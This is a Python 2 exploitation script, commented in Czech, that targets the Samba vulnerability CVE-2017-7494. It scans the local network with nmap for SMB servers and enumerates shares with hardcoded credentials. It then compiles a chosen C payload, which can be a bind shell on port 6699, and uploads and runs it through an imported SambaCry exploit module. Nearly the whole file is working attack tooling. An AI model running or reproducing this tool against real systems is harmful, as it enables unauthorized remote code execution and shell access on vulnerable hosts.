#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

import subprocess
import nmap
import os
import netifaces
import ipaddress
import platform
from exploitsambacry import SambaCry
import time
from impacket.smbconnection import *
from impacket.dcerpc.v5 import transport, srvs

REMOTE_SHELL_PORT = 6699
SMB_PORT = 445
IPV6 = False


def get_ip(v6=False):
    """
    Projde vsechny interface pocitace a vraci vsechny aktivni IP adresy vcetne masky site. Nevraci adresu localhost!

        i - PROZATIM NEPOCITAME S IPV6 ADRESOU

    :param v6: True / False - urcuje zda chceme ziskat IPV6 adresy (prozatim nefunguje)
    :return: Vraci <list> aktivnich IP adres vcetne masky site
    """
    ip_list = []

    interfaces = netifaces.interfaces()
    for i in interfaces:
        if i == 'lo':
            continue
        if v6:
            iface = netifaces.ifaddresses(i).get(netifaces.AF_INET6)
        else:
            iface = netifaces.ifaddresses(i).get(netifaces.AF_INET)
        if iface is not None:
            for j in iface:
                cur_ip = j['addr']
                cur_mask = j['netmask']
                append = False
                if v6:
                    append = False  # Prozatim neumi IPv6
                else:
                    if not cur_ip.startswith('127.') and not cur_ip.startswith('169.254'):
                        append = True
                if append:
                    ip = ipaddress.IPv4Interface(cur_ip + "/" + cur_mask)
                    ip_list.append(ip)
    return ip_list


def get_available_smb(ip, port="445"):
    """
    Hleda pc s dostupnymi zadanymi porty. Provede jejich vypis + dalsi informace o protokolu.
    Dale necha uzivatele  zvolit ip adresu pc s otevrenymi porty v siti s nazvem sluzby netbios-ssn.

    :param ip: Adresa site vcetne masky ve formatu napr. 192.168.1.0/24
    :param port: prohledavane porty
    :return: vraci IP adresu vybraneho serveru, v pripade neuspechu vraci -1
    """
    ns = nmap.PortScanner()
    ns.scan(ip, port)
    print "[?] Vyber Samba server "
    i = 0
    all_host = ns.all_hosts()
    filtered = []
    for host in all_host:
        if (ns[host]['tcp'][SMB_PORT]['state']) == "open" and ns[host]['tcp'][SMB_PORT]['name'] == "netbios-ssn":
            i += 1
            print " [", i, "]", host, "\t", ns[host].hostname(), "\t protokol: ", ns[host]['tcp'][SMB_PORT]['name'], "\t status: ", ns[host]['tcp'][SMB_PORT]['state'], "\t verze: ", ns[host]['tcp'][SMB_PORT]['version']
            filtered.append(host)
        else:
            print "\033[35m [   ]", host, "\t", ns[host].hostname(), "\t protokol: ", ns[host]['tcp'][SMB_PORT]['name'], "\t status: ", ns[host]['tcp'][SMB_PORT]['state'], "\t verze: ", ns[host]['tcp'][SMB_PORT]['version'], "\033[0m"

    # print(ns.csv())
    if len(filtered) != 0:
        user_select = int_input_countdown(i)
        return filtered[user_select-1]
    else:
        print "[!] Zadny Samba server k dispozici "
        return -1


def compile_payload(payload):
    """
    Zjisti verzi OS a v pripade linuxu provede kompilaci Payloadu. Neresi dostupnost gcc. Osetreno vyjimkou.

    :param payload: Nazev souboru zdrojoveho kodu pro kompilaci
    :return: 0 = uspesne zkompilovano, -1 = neuspech
    """
    os_type = platform.system()
    if os_type == "Linux":
        try:
            subprocess.Popen(["gcc", "-shared", "-o", "libpayload.so", "-fPIC", payload], stdout=subprocess.PIPE)
            time.sleep(3)
        except Exception as e:
            print "[-] Exception " + str(e)
            return -1
        return 0
    elif os_type == "Windows":
        print "[!] Windows zatim neni podporovan"
        return - 1
    else:
        print "[!] Nepodporovany OS"
        return - 1


def payload_list(path):
    """
    Projde zadany adresar vraci vechny soubory s priponou .c

    :param path: cesta k prohledavanemu adresari
    :return: <list> dostupnych souboru s priponou .c
    """
    files = []
    # r = root, d = slozky, f = soubory
    for file in os.listdir(path):
        if ".c" in file:
            files.append(file)
    return files


def input_to_int(usr_input):
    """
    Testuje zda-li uzivatelem zadany vstup je cislo. Pokud ano vraci ho.

    :param usr_input: uzivatelsky vstup
    :return: uzyivatelsky vstu prevedeny na int, v pripade neuspechu -1
    """
    try:
        value = int(usr_input)
    except ValueError:
        return -1
    if value <= 0:
        return -1
    return value


def int_input_countdown(i):
    """
    Umoznuje uzivately zadat hodnotu typu int v rozsahu 0-i. V pripade, ze 20x zada spatnou volbu, ukonci program.

    :param i: Definuje maximalni povolenou hodnotu uzivatelskeho vstupu
    :return: Vraci zvolenou hodnotu z povoleneho rozsahu.
    """
    print ">> "
    j = -20
    while j < 0:
        if j == 0:
            print "[!] 20x jsi nezadal cislo od 1 do", i, ", koncim!"
            exit - 1
        try:
            usr_input = input()
            value = input_to_int(usr_input)
        except Exception as e:
            value = -1
            return value
        if 0 < value <= i:
            return value
        print "[i] Zadej cislo od 1 do ", i
        j += 1


def print_from_list(list):
    """
    Vypise obsah zvoleneho listu.

    :param list: list pro vypis
    :return: vraci pocet polozek listu
    """
    i = 0
    for f in list:
        i += 1
        print " [", i, "]", f
    return i


def smb_share_information(target, port, user=None, password=None,):
    """
    Vyhleda sdilene slozky pro zadaneho hosta

    :param target: IP hosta
    :param port:  Port hosta
    :param user: Uzivatelske jmeno
    :param password: Heslo
    :return: <list> s nazvy sdilenych slozek
    """

    try:
        conn = SMBConnection(target, target, sess_port=port)
    except socket.error as error:
        print "[-] Chyba spojeni", error.message
        return

    conn.login(user, password)
    if not conn.login(user, password):
        raise Exception("[-] Chyba autentizace, neplatne uzivatelske jmeno nebo heslo")
    rpc_transport = transport.SMBTransport(
        conn.getRemoteName(), conn.getRemoteHost(), filename=r'\srvsvc', smb_connection=conn
    )
    dce = rpc_transport.get_dce_rpc()
    try:
        dce.connect()
    except SessionError as error:
        pass
    dce.bind(srvs.MSRPC_UUID_SRVS)
    resp = srvs.hNetrShareEnum(dce, 2)

    share_path = []
    ignore_shares = ["print$", "IPC$"]
    for share in resp['InfoStruct']['ShareInfo']['Level2']['Buffer']:
        share_name = share['shi2_netname'][:-1]
        if share_name not in ignore_shares:
            share_path.append(share_name)
    return share_path


ipv4 = "0.0.0.0/0"
usr_name = "sambacry"
usr_passwd = "nosambanocry"

if __name__ == "__main__":

    print """
  ______ _                        _ _____          _ 
 |  ____| |                      | |  __ \\        | |
 | |__  | |_ ___ _ __ _ __   __ _| | |__) |___  __| |
 |  __| | __/ _ \\ '__| '_ \\ / _` | |  _  // _ \\/ _` |
 | |____| ||  __/ |  | | | | (_| | | | \\ \\  __/ (_| |
 |______|\\__\\___|_|  |_| |_|\\__,_|_|_|  \\_\\___|\\__,_| 
"""
    print("                   ---CVE-2017-7494---\n\n")

    print "[+] Zjistuji IP adresy "
    my_ip_list = get_ip(IPV6)

    print "[i] Dostupne IP adresy: "
    print_from_list(my_ip_list)

    if len(my_ip_list) == 1:
        ipv4 = str(ipaddress.IPv4Interface(my_ip_list[0]).network)
    elif len(my_ip_list) > 1:
        print "[?] Vyber sit k prohledani: "
        i = 0
        for f in my_ip_list:
            i += 1
            print " [", i, "]", str(ipaddress.IPv4Interface(f).network)
        value = int_input_countdown(i)
        ipv4 = str(ipaddress.IPv4Interface(my_ip_list[value]).network)
    else:
        exit(-1)

    print "[+] Hledam Smb Server v siti " + ipv4 + ":"
    my_smb_server = get_available_smb(ipv4, str(SMB_PORT))
    if my_smb_server == -1:
        exit(-1)

    shares = smb_share_information(my_smb_server, SMB_PORT, usr_name, usr_passwd)
    if len(shares) == 1:
        shared_folder = shares[0]
    elif len(shares) > 1:
        print "[?] Vyber sdilenou slozku "
        i = print_from_list(shares)
        value = int_input_countdown(i)
        shared_folder = shares[i]
    else:
        exit(-1)

    print "[?] Vyber Payload "
    files = payload_list(os.getcwd())
    i = print_from_list(files)
    value = int_input_countdown(i)
    if files[value-1] == "bindshell-samba.c":
        shell_port = REMOTE_SHELL_PORT
    else:
        shell_port = None

    print "[+] Kompiluji Payload "
    if compile_payload(files[value-1]) != 0:
        print "[-] Nelze zkompilovat "
        exit(-1)

    print "[+] Nahravam Payload "
    SambaCry.exploit(my_smb_server, SMB_PORT, "libpayload.so", shared_folder, "/" + shared_folder + "/libpayload.so", usr_name, usr_passwd, shell_port)

